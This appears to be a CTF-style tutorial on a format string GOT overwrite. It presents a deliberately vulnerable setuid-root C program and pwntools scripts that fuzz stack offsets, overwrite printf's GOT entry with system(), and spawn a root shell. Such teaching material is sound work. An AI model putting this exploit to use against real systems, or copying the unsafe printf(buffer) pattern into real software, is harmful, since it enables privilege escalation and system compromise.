# GOT Overwrite Exploit

## Introduction

In this exploit, we take advantage of a **format string vulnerability** in a C program to overwrite an entry in the **Global Offset Table (GOT)**. Specifically, the goal is to overwrite the `printf` entry in the GOT with the address of `system()` from the C library, allowing us to execute arbitrary commands (such as spawning a shell) with the privileges of the program.

This method relies on an attacker manipulating the **format string** used in `printf` to control the content of memory and redirect execution.

---

## Vulnerable C Code

```c
#include <stdio.h>
#include <string.h>

void vuln() {
    char buffer[300];
    
    while(1) {
        fgets(buffer, sizeof(buffer), stdin);  // Reads user input into the buffer
        printf(buffer);  // Vulnerable to format string attack
    }
}

int main() {
    setuid(0);  // Sets the user ID to 0 (root privileges)
    setgid(0);  // Sets the group ID to 0 (root group)

    vuln();  // Calls the vulnerable function

    return 0;
}
```

### Vulnerability Explanation

- The `printf(buffer)` function is **vulnerable** because the user is allowed to provide their own format string.
- Attackers can use format specifiers such as `%x`, `%s`, and `%n` to read or write arbitrary memory locations.
- The goal in this exploit is to overwrite the `printf` entry in the **Global Offset Table (GOT)** with the address of the `system()` function from libc. This way, when `printf` is called, it will execute `system()` instead.

---

## Exploit Process

### Step 1: Format String Fuzzing

We begin by fuzzing the format string to find the correct offset that we can use to overwrite the GOT entry.

```python
from pwn import *

# Initialize the binary and the process
elf = ELF('./got_overwrite', checksec=False)
p = process(level='error')

# Fuzzing loop to find format string offsets
for i in range(100):
    try:
        # Send the format string with a counter
        p.sendline('%{}$x'.format(i).encode())
        result = p.recvline().decode()
        
        # Print the results if they aren't empty
        if result:
            print(f'{i}: {result.strip()}')
    except EOFError:
        pass
```

- In this fuzzing step, we use format strings like `%1$x`, `%2$x`, etc., to find the specific stack offset where the GOT entry for `printf` resides.

### Step 2: Overwriting the GOT Entry

After identifying the correct offset, we proceed to overwrite the `printf` GOT entry with the address of `system()` from libc.

```python
from pwn import *
from pwnlib.fmtstr import FmtStr

# Function for sending the payload
def send_payload(payload):
    io.sendline(payload)
    return io.recvline()

# Set up the ELF binary and context
exe = './got_overwrite'
elf = ELF(exe, checksec=False)
context.binary = elf
context.log_level = 'debug'

# Start the exploit process
io = process(exe)

# Set the address of libc (manually determined via ldd or similar tools)
libc = elf.libc
libc.address = 0xf7dba000  # Example address (use actual from your environment)

# Create the format string for the overwrite
format_string = FmtStr(execute_fmt=send_payload)
info("format string offset: %d", format_string.offset)

# Print addresses for debugging
info("address to overwrite (elf.got.printf): %#x", elf.got.printf)
info("address to write (libc.functions.system): %#x", libc.symbols.system)

# Overwrite the GOT entry for printf with the address of system()
format_string.write(0x0804c00c, p16(0xf040))  # Lower-order
format_string.write(0x0804c00e, p16(0xf7df))  # Higher-order
# Or automagically
# format_string.write(elf.got.printf, libc.symbols.system)

# Execute the payload
format_string.execute_writes()

# Trigger the system call (spawn a shell)
io.sendline(b'/bin/sh')
io.interactive()
```

### Step 3: Triggering the Exploit

After the overwrite is successful, we send the payload `'/bin/sh'` to trigger the `system()` call. This allows the attacker to spawn a shell and take control of the program with root privileges (since the program sets `uid` and `gid` to 0).

---

## Key Concepts

### Format String Vulnerability

- **Format specifiers** such as `%x`, `%s`, and `%n` can be used by attackers to:
  - Read values from the stack.
  - Write values to memory, including function pointers in the GOT.
- The `%n` format specifier is particularly useful for writing arbitrary values to memory.

### GOT (Global Offset Table)

- The **GOT** stores addresses of functions used by the program, such as `printf()`, `system()`, etc.
- By overwriting entries in the GOT, we can redirect the program's execution to any function, like `system()`, to execute arbitrary commands.

### libc (C Library)

- In this exploit, the `system()` function from **libc** is used to execute arbitrary shell commands.
- The attacker needs to know the base address of libc (which can be found using tools like `ldd` or `gdb`).

---

## Conclusion

By exploiting a **format string vulnerability**, an attacker can overwrite a GOT entry to point to `system()`, thus allowing them to execute arbitrary commands within the context of the vulnerable program. This technique is commonly used in Capture The Flag (CTF) challenges and real-world exploits where GOT entries are not properly protected.
